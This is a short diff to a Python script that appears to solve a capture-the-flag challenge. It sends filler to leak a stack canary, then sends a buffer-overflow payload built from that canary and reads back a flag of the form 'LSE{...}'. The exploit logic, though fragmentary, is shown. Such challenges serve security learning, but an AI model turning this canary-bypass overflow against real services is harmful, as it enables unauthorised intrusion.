@@ -11,7 +11,6 @@ sock.connect(server)
 
 try:
 
-
   message = "A" * 64 + "\n"
   sock.send(message.encode())
 
@@ -23,14 +22,9 @@ try:
   sock.send(message.encode() + canary + overflow)
   time.sleep(1)
   data = sock.recv(65)
-  message = b''
-  while data is not None :
-    data = None
-    data = sock.recv(100, socket.MSG_DONTWAIT)
-    message += data
+  message = sock.recv(200, socket.MSG_DONTWAIT)
 
-  print('FLAG: ' + re.search('LSE{.*}', message.decode('ascii')))
-  # print_flag 08 04 88 4B
+  print('FLAG: ' + re.search('LSE{.*}', message.decode('ascii')).group(0))
 except:
   print('FLAG: ' + re.search('LSE{.*}', message.decode('ascii')).group(0))
 finally:
